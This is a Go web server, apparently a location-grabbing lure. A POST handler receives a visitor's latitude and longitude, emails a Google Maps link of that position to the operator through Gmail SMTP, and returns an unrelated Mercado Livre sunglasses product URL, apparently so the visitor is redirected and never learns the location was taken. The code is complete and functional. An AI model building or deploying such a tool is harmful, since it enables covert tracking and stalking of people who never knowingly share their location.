package main

import (
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	gomail "gopkg.in/mail.v2"
)

type Location struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
}

func main() {
	server := gin.Default()

	server.Use(cors.Default())

	server.Static("/static", "main.html")
	server.GET("/", func(c *gin.Context) {
        c.File("main.html")
    })

	server.POST("/", func(c *gin.Context) {
		var loc Location
		url := "https://www.mercadolivre.com.br/oculos-de-sol-juliet-lupa-do-vilo-mandrake-armaco-prata-cor-da-lente-varias-cores-desenho-lupa-de-vilo-armaco-pratalente-rosa/p/MLB29601503?item_id=MLB4788660232&from=gshop&matt_tool=43232742&matt_word=&matt_source=google&matt_campaign_id=14302214868&matt_ad_group_id=126141901865&matt_match_type=&matt_network=g&matt_device=c&matt_creative=542969653677&matt_keyword=&matt_ad_position=&matt_ad_type=pla&matt_merchant_id=735098639&matt_product_id=MLB29601503-product&matt_product_partition_id=1801429032863&matt_target_id=aud-1966873223882:pla-1801429032863&cq_src=google_ads&cq_cmp=14302214868&cq_net=g&cq_plt=gp&cq_med=pla&gad_source=1&gclid=Cj0KCQjwwae1BhC_ARIsAK4Jfrxjl4BctO2M4tZkvbuBnx_H1_GBGlHeP83Us_WCuqokbyPdPVBcqKoaAmweEALw_wcB"

		if err := c.ShouldBindJSON(&loc); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		mapsLocation := fmt.Sprintf("https://www.google.com/maps/place/%f+%f", loc.Latitude, loc.Longitude)

		log.Printf("Recebido: Latitude %f, Longitude %f\n", loc.Latitude, loc.Longitude)
		log.Printf("Maps: %s", mapsLocation)

		err := SendByEmail(mapsLocation)
		if err != nil {
			log.Printf("err %s", err.Error())
			return
		}

		c.JSON(http.StatusOK, gin.H{"url": url})
	})

	if err := server.Run(":8080"); err != nil {
		log.Fatal(err)
	}
}

func SendByEmail(loc string) error {
	log.Printf("%-12s Enviando notificação via e-mail", "[EMAIL]")
	mail := gomail.NewMessage()

	email := os.Getenv("MY_EMAIL")
	password := os.Getenv("MY_SECRET")
	
	mail.SetHeader("From", email)
	mail.SetHeader("To", os.Getenv("MY_RECEIVED_EMAIL"))
	mail.SetHeader("Subject", "Location")

	mail.SetHeader("Content-Type", "text/plain")

	mail.SetBody("text/plain", loc)
	

	dialer := gomail.NewDialer("smtp.gmail.com", 587, email, password)
	if err := dialer.DialAndSend(mail); err != nil {
		log.Printf("%-12s Erro ao enviar notificação: %s", "[EMAIL]", err)
		return errors.New("error sending notification")
	}
	
	return nil
}